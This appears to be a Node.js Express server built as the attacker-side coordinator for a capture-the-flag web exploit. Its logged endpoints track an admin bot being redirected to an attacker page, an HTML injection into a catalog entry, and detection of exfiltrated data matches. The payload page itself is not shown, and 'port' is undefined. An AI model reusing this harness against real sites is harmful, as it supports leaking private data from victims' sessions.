const express = require("express");
const app = express();

let status = false;
let unlock = false;
let match = false;

app.get("/status", (req, res) => {
	res.send(`${status}`);
});

app.get("/unlock", (req, res) => {
	unlock = true;
	res.send("unlock");
});

app.get("/firstload", (req, res) => {
	console.log("==> Admin opened challenge's page");
	res.send("firstload");
});

app.get("/", (req, res) => {
	console.log("==> Admin was redirected to attacker's page");
	res.sendFile("index.html", { root: __dirname });
});

app.get("/injection", (req, res) => {
	console.log("==> HTML injection was inserted into id=3 catalog");
	setTimeout(() => {
		if (match) console.log("==> There was a match");
		else console.log("==> There wasn't a match");
		match = false;
		unlock = false;
		status = false;
	}, 1000);
	res.send("injection");
});

app.get("/exfiltrated", (req, res) => {
	match = true;
	res.send("exfiltrated");
});

app.get("/fragment", (req, res) => {
	status = true;
	console.log("==> Admin was fragmented");
	let timer = setInterval(async () => {
		if (unlock) {
			res.send("fragment");
			clearInterval(timer);
		}
	}, 1);
});

app.listen(port);
console.log("Server running on port: " + port);
